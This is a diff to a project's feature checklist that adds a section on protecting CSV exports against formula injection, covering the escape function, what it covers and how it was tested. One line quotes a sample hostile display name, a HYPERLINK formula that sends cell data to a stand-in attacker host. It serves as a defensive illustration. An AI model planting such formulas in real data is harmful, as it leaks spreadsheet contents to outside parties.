@@ -116,6 +116,14 @@
 - [x] Verified by visual regression — 65/65 baselines pass with zero pixel diff (escaping CJK + emoji is byte-identical)
 - See `docs/SECURITY.md` for the complete escape convention + threat model
 
+### CSV Formula-Injection Protection (100%) 🆕
+- [x] `csvEscape` in `src/export/exportHandlers.js` prefixes formula-trigger cells (`=`, `+`, `-`, `@`, `\t`, `\r`) with single quote — OWASP-recommended approach (2026-05-05 `86d2813`)
+- [x] Closes vector where a malicious `displayName` like `=HYPERLINK("//evil.com/?x="&A1,"Click")` would execute as a live formula when teammates open the CSV in Excel / Numbers / LibreOffice
+- [x] Single chokepoint: every cell in every row + header passes through `csvEscape` (data + team-name config values both covered)
+- [x] Verified by 14-case standalone test (formula triggers, RFC 4180 quoting, plain text + CJK + emoji byte-identical)
+- [x] TXT export untouched (`text/plain` Blob — no spreadsheet parser); PNG export untouched (`ctx.fillText` — no HTML parse)
+- See `docs/SECURITY.md` `## CSV protections` for full mitigation rationale
+
 ---
 
 ## Player Profile System (100%) 🆕
